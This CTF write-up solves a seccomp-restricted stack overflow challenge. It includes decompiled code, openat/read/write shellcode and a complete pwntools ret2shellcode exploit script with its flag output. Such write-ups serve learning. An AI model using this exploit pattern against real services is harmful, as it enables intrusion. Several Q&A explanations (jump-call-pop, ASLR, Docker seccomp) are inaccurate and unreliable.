# Secret Compartment - Writeup

## Files related to solving the challenge are in the root folder

## Please open issue should you have any questions. It will be added to the respective Q&A section

Author: S006_Destroy Lai Lai's Machine (aka DLLM)

## Situation

**Secret Compartment**

Author: Jackylkk2003 ★★☆☆

We are now providing a compartment storage service with a really cheap price!

We also have a secret compartment available if you are interested.

Well, you can't find it anyway, so I guess it doesn't matter.

`nc chall.25.cuhkctf.org 25039`

Attachments:\
`Secret Compartment.zip` ->\
[DockerFile](./Dockerfile)\
[service](./service)

## The Beginning

Lets take a look at what is in the DockerFile first

```dockerfile
FROM ubuntu:25.10

ARG DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \ 
	apt-get install -y socat && \
	rm -rf /var/lib/apt/lists/*
RUN useradd -M yakitori

WORKDIR /app
COPY --chown=root service ./service
COPY --chown=root flag.txt ./compartment.txt
RUN chmod 755 /app && chmod 755 service && chmod 644 compartment.txt

CMD ["socat", "TCP-LISTEN:3000,fork,reuseaddr", "EXEC:./service,su=yakitori,stderr"]
EXPOSE 3000
```

From this, we can see a few points

- The challenge runs inside a **Docker container built on Ubuntu 25.10**.
- Binary `service` is a 64-bit Linux executable owned by root but runs as user `yakitori`.
- The flag is stored in a file named `compartment.txt` within the container.

So, we need to read the *flag* file `compartment.txt` through exploiting the binary `service`.

## The Beginning - checkpoint Q&A

Q - What is Docker?\
A - Docker is a tool for running isolated applications inside containers.\
CTF usually use a docker for each and every challenge, which almost ensures that the challenges are isolated from each other and repeatable on players' machines, keeping the challenge consistent, maybe safe, but surely fair.

## Service

Let’s jump into the `service` binary itself.

```bash
> checksec --file=service
RELRO           STACK CANARY      NX            PIE             SELFRANDO             Clang CFI            SafeStack            RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX disabled   PIE enabled     No Selfrando          No Clang CFI found   No SafeStack found   No RPATH   No RUNPATH   48 Symbols        No    0               2               service
```

```c
00401229    int64_t setup() {
00401229        void* fsbase;
00401235        int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
0040125d        setvbuf(stdin, nullptr, 2, 0);
0040127b        setvbuf(__bss_start, nullptr, 2, 0);
00401299        setvbuf(stderr, nullptr, 2, 0);
                ... // lots of
                ... // variable inits
004013b9        int64_t result;
004013b9        
004013b9        if (!prctl(0x26, 1, 0, 0, 0)) {
004013e2            if (prctl(0x16, 2, &var_78)) {
004013f5                perror(":<");
004013fa                goto label_401408;
004013e9            }
004013fc            result = 0;
004013b9        } else {
004013c5            perror(":c");
004013c5
00401408        label_401408:
0040140d            if (*(uint32_t*)__errno_location() == 0x16)
00401419                puts(":(");
0040141e            result = 1;
004013b9        }
004013b9        
00401427        *(uint64_t*)((char*)fsbase + 0x28);
00401427        
00401430        if (rax == *(uint64_t*)((char*)fsbase + 0x28))
00401438            return result;
00401438        
00401432        __stack_chk_fail();
00401432        /* no return */
00401229    }
00401439    int64_t fun() {
00401439        void* fsbase;
00401451        int64_t var_10 = *(uint64_t*)((char*)fsbase + 0x28);
00401484        char buf[0x88];
00401484        printf("I have a compartment available for renting at %p, but I bet you cannot find my secret compartment\n", &buf);
00401493        puts("I can rent you some space to put things in this compartment though.");
004014b4        printf("You are lucky that I am making a limited time offer, just HKD %p for 0x88 bytes storage!\n", var_10);
004014c8        gets(&buf);
004014ce        int64_t rax_6 = var_10;
004014ce        
004014db        if (rax_6 == *(uint64_t*)((char*)fsbase + 0x28))
004014e3            return rax_6 - *(uint64_t*)((char*)fsbase + 0x28);
004014e3        
004014dd        __stack_chk_fail();
004014dd        /* no return */
00401439    }
004014e4    int32_t main(int32_t argc, char** argv, char** envp) {
004014e4        setup();
004014fb        fun();
00401506        return 0;
004014e4    }
```

There are a few points worth noting in the executable:

- It’s **reading input unsafely** into a stack buffer of size 0x88 (136) bytes via `gets()`. This screams **buffer overflow** since `gets()` doesn’t check length.\
`gets(&buf);`
- **Stack canaries** are **enabled** for some protection. But, lucky for us, the binary **leaks the stack canary.**\
`printf("You are lucky that I am making a limited time offer, just HKD %p for 0x88 bytes storage!\n", var_10);`
- **Full RELRO & PIE** are also **enabled** which makes the binary’s memory layout non-predictable. However, it leaks the *actual* address of the buffer on the stack, so ASLR is no longer a big problem.\
`printf("I have a compartment available for renting at %p, but I bet you cannot find my secret compartment\n", &buf);`
- The binary uses `prctl` to set up seccomp filters. Basically, it’s restricting what syscalls it can make (more on that in a bit).\
`if (!prctl(0x26, 1, 0, 0, 0))` `if (prctl(0x16, 2, &var_78))`
- The output tells us the buffer address and the canary value right up front, a sweet leak for reliable exploitation.
- Checks for stack smashing are in place, so we have to respect that canary or it’ll crash immediately.

## Service - checkpoint Q&A

Q - What is seccomp?\
A - **Seccomp (Secure Computing)** is a Linux kernel feature used to sandbox processes by restricting the syscalls they can invoke.\
Docker containers commonly use **seccomp profiles** to reduce attack surface by disallowing potentially dangerous syscalls.\
This Docker default seccomp profile **blocks powerful syscalls** like `open()`, `execve()`, and others that can be abused for privilege escalation or breakout attacks.

Q - What is ASLR?\
A - **Address Space Layout Randomization (ASLR)** is a security feature in Linux that randomizes the location of memory pages to prevent code execution from predictable addresses. Thats what Full RELRO (Relocation Read-Only) & PIE (Position Independent Executable) did here.

Q - What is buffer overflow?\
A - It is when a program reads more data into a buffer than it had allocated to store. Without proper validation, this could overwrite any memory location from calculating memory addresses and thus lead to arbitrary code execution.

## Vulns

Now here comes the fun part. How do we get this flag?

### Seccomp filters

The default seccomp profile is setup to **block certain system calls**. Notably:

- `open()` syscall is blocked.
- `execve()` syscall is blocked.
- But **`openat()` syscall** is *allowed* (syscall number 257).

This means you can’t just open files normally, nor spawn a shell, but you can open files with `openat()`. It’s a neat little bypass vector.

### The basic flow - ret2shellcode

1. Connect to the service. Catch the **buffer address** and **canary** leaks.
2. Build **position-independent shellcode** that:
    - Uses `openat(AT_FDCWD, "compartment.txt", O_RDONLY)` to open the flag file.
    - Uses `read()` to pull the flag’s content into memory.
    - Uses `write()` to print the flag to stdout.
    - Uses `exit()` for a clean finish.
3. Create the payload:
    - Put shellcode at the buffer start.
    - Pad until the canary’s position (136 bytes).
    - Insert the leaked canary so we pass stack checks.
    - Overwrite saved base pointer (just filler).
    - Overwrite return address with the exact leaked buffer address. So when the function returns, our shellcode runs.

### Why this works:

- Leaking the canary stops stack smashing detectors from killing us.
- Leaking the buffer address means no guessing where to jump, no ASLR headache.
- Using `openat()` sidesteps seccomp filtering where `open()` is blocked.
- The shellcode is *position independent* thanks to the jump-call-pop trick to get the string address dynamically.
- By reading and writing explicitly, we avoid blocked execve or spawning shells.

## Vulns - checkpoint Q&A

Q - What is position independent code?\
A - **Position independent code** is code that can be **executed at any address in memory**. This is useful when you want to execute code at a specific address, but don’t care where it is.

Q - What is jump-call-pop?\
A - **Jump-call-pop** is a technique used to **execute code at a specific address**. It works by **overwriting the return address** with the address of the code to be executed.

## Exploit

### Shellcode

```asm
jmp get_path            # Jump over data to 'get_path'

open_file:
    pop rsi            # Pop path string address into rsi
    mov rdi, -100      # AT_FDCWD: open at current directory
    xor rdx, rdx       # O_RDONLY = 0
    mov rax, 257       # openat syscall number
    syscall

    mov rdi, rax       # File descriptor from openat syscall
    sub rsp, 0x100     # Allocate 256 bytes buffer on stack
    mov rsi, rsp       # Buffer pointer into rsi
    mov rdx, 0x100     # Number of bytes to read
    xor rax, rax       # read syscall number
    syscall

    mov rdx, rax       # Number of bytes read
    mov rdi, 1         # STDOUT file descriptor
    mov rsi, rsp       # Buffer pointer
    mov rax, 1         # write syscall
    syscall

    mov rdi, 0         # Exit status 0
    mov rax, 60        # exit syscall
    syscall

get_path:
    call open_file     # Push path string address on stack and jump to open_file
    .ascii "compartment.txt\x00"
```

### Full Exploit Script (@ [sol.py](sol.py))

```python
from pwn import *

context.arch = 'amd64'
HOST = 'chall.25.cuhkctf.org'
PORT = 25039
REMOTE_FLAG_PATH = b'compartment.txt'

def exploit():
    # Connect to the remote challenge
    p = remote(HOST, PORT)

    # Parse leaked buffer address
    p.recvuntil(b'renting at ')
    buf_addr_line = p.recvline().strip()
    buf_addr = int(buf_addr_line.split(b',')[0], 16)
    log.info(f"Leaked buffer address: {hex(buf_addr)}")

    # Parse leaked stack canary
    p.recvuntil(b'just HKD ')
    canary_line = p.recvline().strip()
    canary = int(canary_line.split(b' ')[0], 16)
    log.info(f"Leaked stack canary: {hex(canary)}")

    # The shellcode
    code = asm(f"""jmp get_path
    open_file:
        pop rsi
        mov rdi, -100
        xor rdx, rdx
        mov rax, 257
        syscall

        mov rdi, rax
        sub rsp, 0x100
        mov rsi, rsp
        mov rdx, 0x100
        xor rax, rax
        syscall
        
        mov rdx, rax
        mov rdi, 1
        mov rsi, rsp
        mov rax, 1
        syscall

        mov rdi, 0
        mov rax, 60
        syscall

    get_path:
        call open_file
    """)

    shellcode = code + REMOTE_FLAG_PATH + b'\x00'

    # Calculate padding to reach canary offset
    offset_to_canary = 136
    padding = b'A' * (offset_to_canary - len(shellcode))
    saved_rbp = b'B' * 8  # Placeholder for saved frame pointer

    # Construct the final payload
    payload = shellcode + padding + p64(canary) + saved_rbp + p64(buf_addr)
    p.sendline(payload)

    try:
        flag = p.recvall(timeout=5).decode().strip()
        if flag:
            log.success(f"Flag: {flag}")
        else:
            log.warning("No flag received")
    except EOFError:
        log.warning("Connection closed unexpectedly.")
    finally:
        p.close()

if __name__ == '__main__':
    exploit()
```
After running this, we get our

### Flag

```bash
> python3 sol.py
[+] Opening connection to chall.25.cuhkctf.org on port 25039: Done
[*] Leaked buffer address: 0x7fff92ef89a0
[*] Leaked stack canary: 0x89480e680c28f600
[+] Receiving all data: Done (49B)
[*] Closed connection to chall.25.cuhkctf.org port 25039
[+] Flag: cuhk25ctf{Secr3t_C0mpu71ng_1n_S3cure_C0mpartm3n7}
```

## Exploit - checkpoint Q&A

Q - How does the shellcode get the flag path address?\
A - The shellcode jumped to the function `get_path` first, then the function called `open_file` with the flag path string appended right after the call. This pushes the path into the stack, allowing the `open_file` function to get the flag path using `pop`.

## Aftermath

Believe it or not this is the first non-baby pwn chal I have ever done, and I surely learnt alot from it.

Also the challenge name being `Secret Compartment` can be shortened to `SecComp` too and thats literally the main vuln of this chal lol.

- **Seccomp filters** heavily restrict syscalls but can sometimes be bypassed by using allowed syscalls creatively.
- Haha shellcode go brrr :fire:
- omg I can do pwn!!

## Aftermath - checkpoint Q&A

Q - :moyai:\
A - I don't think you need a Q&A for aftermath lol
